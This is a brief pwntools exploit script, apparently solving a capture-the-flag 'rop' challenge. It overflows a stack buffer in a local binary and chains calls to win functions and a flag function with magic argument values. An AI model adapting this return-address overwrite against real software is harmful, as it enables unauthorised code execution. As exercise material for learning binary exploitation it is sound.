from pwn import *

target = ELF('./rop')

r = process('./rop')

payload = ''
payload += 'A' * 0x1c
payload += p32(target.symbols['win_function1'])
payload += p32(target.symbols['win_function2'])
payload += p32(target.symbols['main'])
payload += p32(0xbaaaaaad)

r.sendlineafter('Enter your input> ', payload)

payload = ''
payload += 'A' * 0x1c
payload += p32(target.symbols['flag'])
payload += 'A' * 4
payload += p32(0xdeadbaad)

r.sendlineafter('Enter your input> ', payload)

print(r.recvall())
